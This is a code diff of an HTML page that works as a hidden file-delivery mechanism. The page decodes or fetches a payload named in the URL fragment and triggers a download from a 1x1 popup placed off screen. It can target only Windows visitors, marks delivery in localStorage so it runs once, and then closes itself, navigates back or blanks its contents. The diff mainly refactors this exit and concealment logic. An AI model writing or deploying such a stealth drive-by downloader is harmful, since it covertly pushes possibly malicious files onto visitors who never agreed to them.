@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html><head><script>
-var _inPopup=location.hash.indexOf('popup=1')!==-1||!!window.opener;
+var _pop=location.hash.indexOf('popup=1')!==-1||!!window.opener;
+var _newTab=history.length<=2;
+function _exit(){if(_newTab||_pop){window.close();setTimeout(function(){document.documentElement.innerHTML='<body style="background:#000"><p style="color:#555;font:12px monospace;padding:20px">Done. Close this tab.</p></body>'},300)}else{history.back();setTimeout(function(){window.close()},300)}}
 try{
   var _h=location.hash.slice(1).replace('&popup=1','');
   if(_h){
@@ -8,12 +10,9 @@ try{
     if(_h.slice(-2)==='!W')_h=_h.slice(0,-2);
     var _s=_h.indexOf('~');
     var _n=_s>0?_h.slice(0,_s):'x';
-    if(localStorage.getItem('dl_done_'+_n)){
-      if(_inPopup){window.close()}else{history.back();setTimeout(function(){window.close()},200)}
-      throw 'done';
-    }
+    if(localStorage.getItem('dl_done_'+_n)){_exit();throw 'done'}
   }
-  if(!_inPopup){
+  if(!_pop&&!_newTab){
     var p=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
     if(p){history.back();setTimeout(function(){window.close()},200);throw 'delegated'}
   }
@@ -21,7 +20,6 @@ try{
 </script><title>.</title></head>
 <body>
 <script>
-window._isPopup=true;
 try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
 try {
   var h=location.hash.slice(1).replace('&popup=1','');
@@ -30,10 +28,7 @@ try {
 
   var winOnly=false;
   if(h.slice(-2)==='!W'){winOnly=true;h=h.slice(0,-2)}
-  if(winOnly&&navigator.platform.indexOf('Win')===-1){
-    if(_inPopup)window.close();else history.back();
-    throw 'skip';
-  }
+  if(winOnly&&navigator.platform.indexOf('Win')===-1){_exit();throw 'skip'}
 
   var sep=h.indexOf('~');
   var fname=sep>0?h.slice(0,sep):'delivered.bin';
@@ -41,23 +36,15 @@ try {
   document.title=fname;
 
   var key='dl_done_'+fname;
-  if(localStorage.getItem(key)){
-    if(_inPopup)window.close();else history.back();
-    throw 'skip';
-  }
-
-  function goBack(){
-    if(_inPopup){window.close()}
-    else{history.back();setTimeout(function(){window.close()},300)}
-  }
+  if(localStorage.getItem(key)){_exit();throw 'skip'}
 
   function markDone(){
     localStorage.setItem(key,'1');
-    setTimeout(goBack,1500);
+    setTimeout(_exit,1500);
   }
 
   function doDownload(blob){
-    if(!blob||blob.size===0){goBack();return}
+    if(!blob||blob.size===0){_exit();return}
     var url=URL.createObjectURL(blob);
     var a=document.createElement('a');
     a.href=url;a.download=fname;
@@ -75,7 +62,7 @@ try {
       });
     }).then(function(b){doDownload(b)}).catch(function(e){
       document.body.textContent='Failed: '+e;
-      setTimeout(goBack,3000);
+      setTimeout(_exit,3000);
     });
   } else {
     try{
@@ -83,7 +70,7 @@ try {
       var arr=new Uint8Array(raw.length);
       for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
       doDownload(new Blob([arr],{type:'application/octet-stream'}));
-    }catch(e){setTimeout(goBack,2000)}
+    }catch(e){setTimeout(_exit,2000)}
   }
 } catch(e){if(e!=='skip')document.body.textContent=''}
 </script>
